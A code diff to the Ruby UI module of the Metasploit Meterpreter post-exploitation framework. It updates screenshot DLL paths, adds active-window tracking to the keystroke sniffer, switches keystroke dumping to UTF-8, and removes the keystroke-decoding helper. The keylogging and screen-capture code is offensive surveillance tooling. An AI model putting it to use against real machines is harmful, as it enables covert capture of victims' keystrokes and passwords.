@@ -157,7 +157,7 @@ class UI < Rex::Post::UI
 
     # include the x64 screenshot dll if the host OS is x64
     if( client.sys.config.sysinfo['Architecture'] =~ /^\S*x64\S*/ )
-      screenshot_path = MeterpreterBinaries.path('screenshot','x64.dll')
+      screenshot_path = MetasploitPayloads.meterpreter_path('screenshot','x64.dll')
       if screenshot_path.nil?
         raise RuntimeError, "screenshot.x64.dll not found", caller
       end
@@ -172,7 +172,7 @@ class UI < Rex::Post::UI
     end
 
     # but always include the x86 screenshot dll as we can use it for wow64 processes if we are on x64
-    screenshot_path = MeterpreterBinaries.path('screenshot','x86.dll')
+    screenshot_path = MetasploitPayloads.meterpreter_path('screenshot','x86.dll')
     if screenshot_path.nil?
       raise RuntimeError, "screenshot.x86.dll not found", caller
     end
@@ -207,8 +207,9 @@ class UI < Rex::Post::UI
   #
   # Start the keyboard sniffer
   #
-  def keyscan_start
+  def keyscan_start(trackwindow=false)
     request  = Packet.create_request('stdapi_ui_start_keyscan')
+    request.add_tlv( TLV_TYPE_KEYSCAN_TRACK_ACTIVE_WINDOW, trackwindow )
     response = client.send_request(request)
     return true
   end
@@ -226,41 +227,9 @@ class UI < Rex::Post::UI
   # Dump the keystroke buffer
   #
   def keyscan_dump
-    request  = Packet.create_request('stdapi_ui_get_keys')
+    request  = Packet.create_request('stdapi_ui_get_keys_utf8')
     response = client.send_request(request)
     return response.get_tlv_value(TLV_TYPE_KEYS_DUMP);
-  end
-
-  #
-  # Extract the keystroke from the buffer data
-  #
-  def keyscan_extract(buffer_data)
-    outp = ""
-    buffer_data.unpack("n*").each do |inp|
-      fl = (inp & 0xff00) >> 8
-      vk = (inp & 0xff)
-      kc = VirtualKeyCodes[vk]
-
-      f_shift = fl & (1<<1)
-      f_ctrl  = fl & (1<<2)
-      f_alt   = fl & (1<<3)
-
-      if(kc)
-        name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
-        case name
-        when /^.$/
-          outp << name
-        when /shift|click/i
-        when 'Space'
-          outp << " "
-        else
-          outp << " <#{name}> "
-        end
-      else
-        outp << " <0x%.2x> " % vk
-      end
-    end
-    return outp
   end
 
 protected
